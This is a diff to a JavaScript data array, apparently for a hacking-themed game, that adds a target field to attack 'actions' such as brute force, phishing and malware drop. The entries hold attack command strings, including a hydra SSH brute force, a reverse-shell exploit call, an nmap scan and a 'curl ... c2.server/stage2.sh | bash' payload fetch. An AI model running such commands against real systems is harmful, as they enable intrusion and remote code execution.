@@ -4,7 +4,8 @@ export const action_description = [
     name: "Brute Force",
     complexityTier: "Tier 1 (Novice)",
     description: "Executes automated high-speed dictionary attacks to crack passwords and system keys.",
-    command: "hydra -l admin -P /wordlists/rockyou.txt <TARGET_IP> ssh",
+    target: "sys_ip",
+    command: "hydra -l admin -P /wordlists/rockyou.txt <TARGET> ssh",
     hiddenDetails: "Generates extreme log noise. Triggers account lockouts and IP rate-limiting if unthrottled."
   },
   {
@@ -12,6 +13,7 @@ export const action_description = [
     name: "Phishing Kit",
     complexityTier: "Tier 1 (Novice)",
     description: "Deploys cloned authentication portals and social engineering vectors to harvest user credentials.",
+    target: "email",
     command: "phish-deploy --template corporate_login --relay-smtp <MAIL_SERVER>",
     hiddenDetails: "Targets human error rather than code vulnerabilities. Yields high result rates on non-MFA targets."
   },
@@ -20,7 +22,8 @@ export const action_description = [
     name: "Exploit Script",
     complexityTier: "Tier 3 (Advanced)",
     description: "Executes targeted payloads against known code vulnerabilities to secure remote shell access.",
-    command: "python3 exploit_cve.py --host <TARGET_IP> --payload rev_shell",
+    target: "sys_ip",
+    command: "python3 exploit_cve.py --host <TARGET> --payload rev_shell",
     hiddenDetails: "High impact. Can cause target service crashes if memory offsets are incorrectly calculated."
   },
   {
@@ -28,7 +31,8 @@ export const action_description = [
     name: "Port Scanner",
     complexityTier: "Tier 1 (Novice)",
     description: "Probes target IP ranges to map active hosts, open ports, and running service protocols.",
-    command: "nmap -sS -T4 -p 1-65535 <TARGET_IP>",
+    target: "sys_ip",
+    command: "nmap -sS -T4 -p 1-65535 <TARGET>",
     hiddenDetails: "Low execution cost. Essential for early recon, but easily picked up by basic Intrusion Detection Systems (IDS)."
   },
 
@@ -37,7 +41,8 @@ export const action_description = [
     name: "Deep Scanner",
     complexityTier: "Tier 2 (Intermediate)",
     description: "Performs deep banner-grabbing and OS fingerprinting to expose specific unpatched software vulnerabilities.",
-    command: "vulnscan --deep --service-version <TARGET_IP>",
+    target: "sys_ip",
+    command: "vulnscan --deep --service-version <TARGET>",
     hiddenDetails: "Reveals actionable CVEs for direct exploitation, but increases target server CPU load during analysis."
   },
   {
@@ -45,6 +50,7 @@ export const action_description = [
     name: "Packet Sniffer",
     complexityTier: "Tier 2 (Intermediate)",
     description: "Switches local interfaces into promiscuous mode to passively capture unencrypted data streams in transit.",
+    target: "bots",
     command: "tcpdump -i eth0 -A 'tcp port 80 or tcp port 21'",
     hiddenDetails: "100% passive and completely invisible unless ARP spoofing is required to reroute network traffic."
   },
@@ -53,6 +59,7 @@ export const action_description = [
     name: "Credential Stuffing",
     complexityTier: "Tier 2 (Intermediate)",
     description: "Injects massive dumps of previously leaked credential pairs across target login endpoints.",
+    target: "sys_ip",
     command: "stuff-auth --combo breach_dump.txt --endpoint https://<TARGET>/api/login",
     hiddenDetails: "Relies heavily on cross-site password reuse. Requires rotating proxy pools to evade automated IP bans."
   },
@@ -61,6 +68,7 @@ export const action_description = [
     name: "Session Hijack",
     complexityTier: "Tier 3 (Advanced)",
     description: "Intercepts or predicts active session tokens to impersonate an authenticated user without password access.",
+    target: "sessions",
     command: "hijack-session --cookie 'SESSIONID=x9f8a2...' --target-user admin",
     hiddenDetails: "Bypasses primary authentication controls completely. Operates within normal traffic patterns to avoid detection."
   },
@@ -69,6 +77,7 @@ export const action_description = [
     name: "Malware Drop",
     complexityTier: "Tier 3 (Advanced)",
     description: "Establishes a staging link to download persistent backdoors, keyloggers, or RATs onto the target machine.",
+    target: "bots",
     command: "curl -s http://c2.server/stage2.sh | bash",
     hiddenDetails: "Establishes long-term persistence. Requires obfuscation to slip past local Endpoint Detection & Response (EDR)."
   },
@@ -77,7 +86,8 @@ export const action_description = [
     name: "DDoS Burst",
     complexityTier: "Tier 3 (Advanced)",
     description: "Rallies botnet clusters to flood target network pipelines, causing server exhaustion and outages.",
-    command: "botnet-flood --type syn-flood --target <TARGET_IP> --rate 10Gbps",
+    target: "sys_ip",
+    command: "botnet-flood --type syn-flood --target <TARGET> --rate 10Gbps",
     hiddenDetails: "Overwhelms target availability entirely, but leaves massive network traces and cannot extract sensitive data."
   },
   {
